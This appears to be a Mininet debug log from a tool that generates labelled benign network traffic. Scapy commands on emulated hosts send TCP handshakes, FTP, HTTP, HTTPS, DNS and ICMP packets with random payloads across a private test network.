+2025-07-13 20:56:22,414 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=22, dport=25108, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:22,475 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:23,005 - mininet - DEBUG - 
+2025-07-13 20:56:23,005 - BENIGN - DEBUG - Generated SSH ACK reply from h5:22 <- h3:25108 [len=54B]
+2025-07-13 20:56:23,005 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=48979, dport=21, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:23,066 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:23,624 - mininet - DEBUG - 
+2025-07-13 20:56:23,624 - BENIGN - DEBUG - Generated FTP SYN from h3:48979 -> h5:21 [len=54B]
+2025-07-13 20:56:23,638 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=21, dport=48979, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:23,699 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:24,254 - mininet - DEBUG - 
+2025-07-13 20:56:24,254 - BENIGN - DEBUG - Generated FTP SYN-ACK from h5:21 <- h3:48979 [len=54B]
+2025-07-13 20:56:24,268 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=48979, dport=21, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:24,329 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:24,897 - mininet - DEBUG - 
+2025-07-13 20:56:24,897 - BENIGN - DEBUG - Generated FTP ACK from h3:48979 -> h5:21 [len=54B]
+2025-07-13 20:56:24,908 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ftp_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=48979, dport=21, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'a9e79bbc6d2d786620088dbecfb9240d74d2b713041040936d1e8392a0ef1340b4e15ede339d0ea72b539a3380a12f61a954b2a7b88647f4e9411827fd5a0021e7a97ed0b3b94e7d70c456b8632b5e97d8ce4bd9e3a05cf890997e6581ae96bcf19d3aa5f0ed608ce816a92e3bb6194e93d4b04e1ced5e877834c22c1dc66e2e95a29160698737e53e4236533a8277d3a08f7e1e4669dc32671a8489626bb9b5f1731f6a322de5a81a81586af6c8eb823e6a01a753a55c70d36ee3670ed15cafd43d1b754db0aa1ca4bdee43e59f47fd42d6d8d65b80599d0e5b5c84063e8d448c2189efdefdccadedc22b544e22eec612de32f979624fcd56f1835712c6c60df443499b2a7789ee12d9be6aace10dcd52c598c2daff302ff355b652ace3c03e4a3ec82ce22f8a5e3acef315b1561a112a5aeecbf5379f448414f30e140beefe73f0492c2c2d382688a51feed41485bdd598dce277c929a613573ec14bf28093f4b0409f9227bb3822369cc74b569db9d5c4d7759e80376252e32888678c8d81b166e233525667ce8c89384a84a32a4a5d5101b0f95076ae9433f43b2d9dcff911a8cc791a0e5ad4bd6e8ccc2d1c9d748c638f6557e2e4985c39ead64d0ad9409dcef91fbcbc0a6a20e8f9f66e9c52823e19c5eaf4a12c29d04ffed747af33afc4130f44182ae8ace49e2762a8d731b84a294c18d89c80a7bf036740c6332be71b50794b326f59fd6e50d189651c05378461a81550de749b13a56da89b7465a7b42925849f934ead379372f1fd60b531ad251a35c05564696db510c9f6e33f25b5aa94157fc471ea69e1aba6eaec1ba462248622c9b0f47d4869d887de225cba72728e48c3fd68e5910e20b18d86b6aabe8261c5cb5ed2fb1dc60da062e39186d3cf03d539b4c042f2153856bc41d32286c5d4a58e4ecec1850747d7d7d5567e4c13d9055b90e0dff198f3a40badcdd365aaabae8f3b4da7abd6470656ec30710183905381fb66805bb19ed3cd86fa3d6505076cde86cc09c9070943a45d652d1d7066f84ce9331de9231a84371a01fc8d7da6dd0a5bb23a8ae9873937dbe9ceb2bd5125b0f151a8218a81dbabb765b0dabb38e130cdec76751a6d3240ded9e02811b704b30510ec9e6769cc9fefe50b5d7560e32fb1fe5455193cf146b482f82385835c1121edb631e19022f30bc0464a07cfde34c6585f04ae525353ef1dcfcc8ccf3ac03cee910d918b3d8b48a4dd99e7e1dd7a16588cc06e59a18a4f592e82196eae700c6873dc59986c3cbb77eca304a760d992b0269e7997b45feaa105d512ba65f906f5a6661ca0685b05ddaff9cd2903368b73f6b189044ce1a52a0fe255389e352869ada1b279486738e0d74b4964e7f5a4b27d9d4498b28b2347a3108b76b9c6cb9d2b90303a3748791e88c8e15d3d20832cce7ffc9441d5c87cc7c7c3a72231fe70167283a0b452583cfd0599faedee723790ef2eb378e9baa2d1e458a71d5570bdd7018872e5eba30c4e12b717bb2cfffe5b0f3f07b42a46b61b8b308b4af456c238300522a37922c5cc05ecf41c429f19f6247f6a24f3a20a2883c81cb63d91abfff632d6181b564d813ed8cbc3f3d58f6fa344c91c3eea946d6b9d16e462aedc912457e5b38966828fcb32f9a36fe338bde837c566d9ef176b867413efa889b3509ec7b7efaf65b71d62914e6d06e7c2aa86b3ba28282bde468b37256176dce95a374d083838a3d6f403fa25e057b2404b185546a5d4c6b4d5b75e8030091f42a0d0386e00f497472bc3b8d83534e61b9b470bce335ac85dfd8da2d967a72473295be9a5c93108db8426f8ada0b9aefff5d55683f3bd13e582146c92a7f7b35d55c755b08f18af03ab60d0f6b9e2b6e2db4b1dd0db245cde715bb0ce8f7073969867dd0c5425ddd44c6e7e431a0a08bdc13b7dffdabc60f7e4ac9655d68cac3edc42bb8143a7f11d9491d60ccd7959b417275cafd7a48c11d05dd052ce8876a2065a8b9e7c698d78ddf1769f99a44f0f5012551029131239cc3da199a02c60d3975519c10c181ca1c855b81c9fcb5918005589772da7\')); sendp(ftp_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:24,970 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:25,469 - mininet - DEBUG - Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+
+2025-07-13 20:56:25,469 - mininet - DEBUG -   File "/home/user/.local/lib/python3.6/site-packages/scapy/sendrecv.py", line 483, in sendp
+    **kargs
+
+2025-07-13 20:56:25,470 - mininet - DEBUG -   File "/home/user/.local/lib/python3.6/site-packages/scapy/sendrecv.py", line 417, in _send
+
+2025-07-13 20:56:25,470 - mininet - DEBUG -     realtime=realtime, return_packets=return_packets)
+  File "/home/user/.local/lib/python3.6/site-packages/scapy/sendrecv.py", line 377, in __gen_send
+
+2025-07-13 20:56:25,470 - mininet - DEBUG -     s.send(p)
+  File "/home/user/.local/lib/python3.6/site-packages/scapy/arch/linux.py", line 567, in send
+
+2025-07-13 20:56:25,470 - mininet - DEBUG -     return SuperSocket.send(self, x)
+  File "/home/user/.local/lib/python3.6/site-packages/scapy/supersocket.py", line 110, in send
+
+2025-07-13 20:56:25,470 - mininet - DEBUG -     return self.outs.send(sx)
+
+2025-07-13 20:56:25,470 - mininet - DEBUG - OSError: [Errno 90] Message too long
+
+2025-07-13 20:56:25,557 - mininet - DEBUG - 
+2025-07-13 20:56:25,557 - BENIGN - DEBUG - Generated FTP data traffic from h3:48979 -> h5:21 [content='FTP file transfer'] [Session 13] [len=1523B]
+2025-07-13 20:56:25,557 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=21, dport=48979, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:25,618 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:26,164 - mininet - DEBUG - 
+2025-07-13 20:56:26,165 - BENIGN - DEBUG - Generated FTP ACK reply from h5:21 <- h3:48979 [len=54B]
+2025-07-13 20:56:26,165 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=17539, dport=80, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:26,226 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:26,774 - mininet - DEBUG - 
+2025-07-13 20:56:26,774 - BENIGN - DEBUG - Generated HTTP SYN from h3:17539 -> h5:80 [len=54B]
+2025-07-13 20:56:26,787 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=80, dport=17539, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:26,848 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:27,397 - mininet - DEBUG - 
+2025-07-13 20:56:27,397 - BENIGN - DEBUG - Generated HTTP SYN-ACK from h5:80 <- h3:17539 [len=54B]
+2025-07-13 20:56:27,411 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=17539, dport=80, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:27,471 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:28,020 - mininet - DEBUG - 
+2025-07-13 20:56:28,020 - BENIGN - DEBUG - Generated HTTP ACK from h3:17539 -> h5:80 [len=54B]
+2025-07-13 20:56:28,034 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;http_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=17539, dport=80, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'474554202f696e6465782e68746d6c20485454502f312e310d0a486f73743a2031302e302e302e350d0a557365722d4167656e743a20536361707942656e69676e547261666669630d0a436f6e74656e742d4c656e6774683a203330350d0a0d0a2d792e55153cc76650d763d1f62d2c23d354c8702ffa166f18c50141d413c37324017f3e23bb82eee0b31380f05fe82a01793514ee2335e6c7321ca3cd67ffb41bd974c2781b96ac95924eb9d57e34200364d61897e4758ae8d683c175019c5a4937fe585bb8284408939d15b3e252a459e9942c73916d44624882121757a5961b767122081d72e57576df3ef38ec8689662fe4ec19be486b4f629f92ffea151068ab56635b824330e8143204b99bea99aeee4678a5e102b11f2bc5e42342a5a92218fa3c3f147d7c5e9587d78c166816ee9ea1ee32bdb666967ab019179f448cbdb5adeaca53fed89328404441a473cb9a6137ebb6b16a19e5a80b3013157861b96d2014438776715ec421d9d27a403e802328cb19109907083b0c2c8c89e0cf1183f0b6238826bc7297040f58b1c9d2b\')); sendp(http_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:28,095 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:28,634 - mininet - DEBUG - 
+2025-07-13 20:56:28,634 - BENIGN - DEBUG - Generated HTTP data traffic from h3:17539 -> h5:80 [content='GET /index.html HTTP/1.1'] [Session 14] [len=456B]
+2025-07-13 20:56:28,634 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=80, dport=80, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:28,696 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:29,260 - mininet - DEBUG - 
+2025-07-13 20:56:29,260 - BENIGN - DEBUG - Generated HTTP ACK reply from h5:80 <- h3:17539 [len=54B]
+2025-07-13 20:56:29,261 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=43005, dport=443, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:29,322 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+2025-07-13 20:56:29,322 - mininet - DEBUG - 
+  import cryptography
+
+2025-07-13 20:56:29,873 - mininet - DEBUG - 
+2025-07-13 20:56:29,873 - BENIGN - DEBUG - Generated HTTPS SYN from h3:43005 -> h5:443 [len=54B]
+2025-07-13 20:56:29,885 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=443, dport=443, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:29,946 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:30,479 - mininet - DEBUG - 
+2025-07-13 20:56:30,480 - BENIGN - DEBUG - Generated HTTPS SYN-ACK from h5:443 <- h3:43005 [len=54B]
+2025-07-13 20:56:30,492 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=43005, dport=443, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:30,553 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:31,094 - mininet - DEBUG - 
+2025-07-13 20:56:31,094 - BENIGN - DEBUG - Generated HTTPS ACK from h3:43005 -> h5:443 [len=54B]
+2025-07-13 20:56:31,107 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;https_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=43005, dport=443, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'f5a3551d5584f94a09e1a2c8e13855bfe958835e039e1414e8ffa745430d163d7a40e19c1dda486ae833b393e69c2f25e536a82af1b5bd7985e0712b2d4f6ee7d30ac9f3063c2b3bff9c5ac03b5b0b3dee5ec55413ef8f7771e85ff864476162838a1faf13cbf1334a8e55c7b8ac2a22ed283e4972f694ebda2bfa98a0d59ea964b0d80c13cc93a8a937909d1c0ce3f5dbce7e85820e5d736f4fbec80058cb1a44ee78d79fd5bf24b68923c2366ec4b5f530edf2aee9c0b6ed5768f8fdfc3eeef90793492b543f7a7c1890eb4c2fd00de8698108458f3b99bf761d610b5ae47ed95d7fed1bc3165d57c04aedf3ebe4c57b4695874e6f488dd719485bc8667aa14ab57ad919478bfc75410528e266d95f651d958231aa8aa5b0dad89e71a174809122f8ce300937d401b6513af75e8234643f1e3dc440af3b293a78642d26ddc937fd3dbcc71ba94542bcb255b14f7f32062f1a3c14926f\')); sendp(https_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:31,168 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:31,711 - mininet - DEBUG - 
+2025-07-13 20:56:31,711 - BENIGN - DEBUG - Generated HTTPS data traffic from h3:43005 -> h5:443 [content='Encrypted Application Data'] [Session 15] [len=397B]
+2025-07-13 20:56:31,712 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=443, dport=443, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:31,773 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:32,312 - mininet - DEBUG - 
+2025-07-13 20:56:32,312 - BENIGN - DEBUG - Generated HTTPS ACK reply from h5:443 <- h3:43005 [len=54B]
+2025-07-13 20:56:32,312 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;dns_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/UDP(sport=48056, dport=53)/DNS(rd=1, qd=DNSQR(qname=\'example.com\')); sendp(dns_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:32,373 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:32,924 - mininet - DEBUG - 
+2025-07-13 20:56:32,924 - BENIGN - DEBUG - Generated DNS query from h3:48056 -> h5:53 [qname='example.com'] [Session 16] [len=71B]
+2025-07-13 20:56:33,026 - mininet - DEBUG - *** h3 : ('ping -c 1 10.0.0.5 > /dev/null',)
+
+2025-07-13 20:56:33,029 - mininet - DEBUG - 
+2025-07-13 20:56:33,030 - mininet - DEBUG - *** h5 : ('ping -c 1 10.0.0.3 > /dev/null',)
+
+2025-07-13 20:56:33,033 - mininet - DEBUG - 
+2025-07-13 20:56:33,033 - BENIGN - DEBUG - Generated ICMP traffic 2 [len=84B]
+2025-07-13 20:56:33,033 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=58160, dport=12345, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:33,094 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:33,652 - mininet - DEBUG - 
+2025-07-13 20:56:33,652 - BENIGN - DEBUG - Generated TCP SYN from h3:58160 -> h5:12345 [len=54B]
+2025-07-13 20:56:33,665 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=12345, dport=58160, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:33,726 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:34,279 - mininet - DEBUG - 
+2025-07-13 20:56:34,279 - BENIGN - DEBUG - Generated TCP SYN-ACK from h5:12345 <- h3:58160 [len=54B]
+2025-07-13 20:56:34,291 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=58160, dport=12345, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:34,353 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:34,904 - mininet - DEBUG - 
+2025-07-13 20:56:34,904 - BENIGN - DEBUG - Generated TCP ACK from h3:58160 -> h5:12345 [len=54B]
+2025-07-13 20:56:34,917 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;tcp_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=58160, dport=12345, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'7d004d1f0686391a9fec37c466b87863fa0ee0f8f916f5a886fda6032b142d700d4aa5cc428b1f1d0d20c27ed53dfa5bdfee03ba04772b206be45d4aaf1ebe03ea09f41839c559e188943d65355670c26dc8b5b8e7b7c534003eef06990ca72aa61e6b946dbfbb0077af1f528f26516f0f066fb538f4fe88a9c50ef01fd3bc1ffa0d938b4fe5ded5d93f1729a8c0d328052a87ee7fbd6ec17451c42be1ed9384cb3b4d9826e3196a54065c6461846944ff4813af82bbb740fe0415a004a7dc99c0156301b4f3e016a1778c1ef42e5bd3c5fdcc71fb3f941b5fc09b481dd26f9d78c755aec4f0d73d61a5191004f80cfb6ec03db7116c918fc5628f3c834a38720427f05ccfcd8f713a5b130789363bc78341e41f1b2625125d1e0c4854ba9874aa162d665f70a2d7ebe607242f6c49774fe35d88aba2e3c79a178bdea4608b3e230c04c8eba3e58498633e037f8368193c5b7f563391b97430cee41a00e8f223f729a81d2548e1ecf8c543ff5e3d8a90219f37470d5a47071fa383a9d10161488d744de28f9312e9619eec8fc60757099ec713265727428a0d25e7cdfc92e80d0ec3a379bd9edd07e2157a4277c49f7fe5d732c246f196a3d9d37eda8c1477b20182b5091259292419038c4ad2f2cd5a3a78e3e493aebc5f34e3cedd808aa0c08841b795db6d6e1443f230afb51f884bdf2460a9a2f98d0d0e04e238f387e9e64dd83d3f5ba6ea566e349c9bd5535bb8908b76f85892d238abf125209f8d0fcfb22164b149d98256b6ed64d8be9868bcd89c4d6d720cd32262ab9815fb4cabbd5d39e78c53d147835b0ec37a42d7c606bf7de3193a9bc8fd004ff6ccc35d03f2a8fb784a76d5bea7b2a28ac18b5e0ba14e75a0af8bd5592aa7c7eb9d2c3cfea3e995622d96abb00ab61cdaee49c9a838bfadc54dfc0e433ba26ddcc3a74e386dbff36f756ab94f287e08f57aae5095d333f326788b65886c812c1369feb74e9939e50adc5bfbeba155a75544a5ef0c978318cf3f462321c1fef1ce9fd4a32c036e75f2b0ad99eecb3bd751b207253a64215ccb8f0d85e42afce8b17708f7572e2f925fb7808a22bf87392011176d59fd784775b420f56999a72f89a9ee77fcb097858e055904d923aac0cc459af39bf0f7b0b9f2c110ddef58f780202f45b99c205f657dc568de50ec1ce6f06b84aaab94f7dc54eaf71f10bfb6748577503ee0581e00e480a3828f334b5c60a904d4e0ab9eb633d3a3e69d0dc1583a1a5ee436fc3d133e848a9c020c351cf7dabc07b92aa3c8380127733be61b57efb41f30cc6a9980e7f33fec3adb197ce83c122d89ee5981b9e667df80c78089f6e3909f3cbcdd7b2fd4efabd24e29b80cdae595f9e17a8e515bdf30ad6c208e3dfaef4eb01ffedd2f7423df9f6bbddf67e681120e16bdcd7c96dcffaa36b89b6e05333fa7f3bc078f7dc61bf4b499740159b109052cc0123b5dba838f2ac8a58dd1dc53076bd6695dfdc59162d7a247145b376952ecc04e52b6b44d70b07e4e0dfee568f70d4b787dfed601fa34e80bc11eddcad7b249679f9855af86fad873dfc15f1f29b8fe828cf0748a0d711516368b6d23fd402374e1a62331edc83ffaefa4363b331b8fbf8023a4320880d62d4857c6493a336e4a18b81cba9cbbf48286d42a4587c4bca3cdb40f95546b79ee06c9d0f5eb92ebd1c09c3afd9197b8cfa09b9bb7703d59a0987fc484e5db1d43\')); sendp(tcp_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:34,979 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:35,509 - mininet - DEBUG - 
+2025-07-13 20:56:35,509 - BENIGN - DEBUG - Generated TCP data traffic from h3:58160 -> h5:12345 [content='TCP data'] [Session 17] [len=1281B]
+2025-07-13 20:56:35,509 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=12345, dport=58160, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:35,570 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:36,111 - mininet - DEBUG - 
+2025-07-13 20:56:36,111 - BENIGN - DEBUG - Generated TCP ACK reply from h5:12345 <- h3:58160 [len=54B]
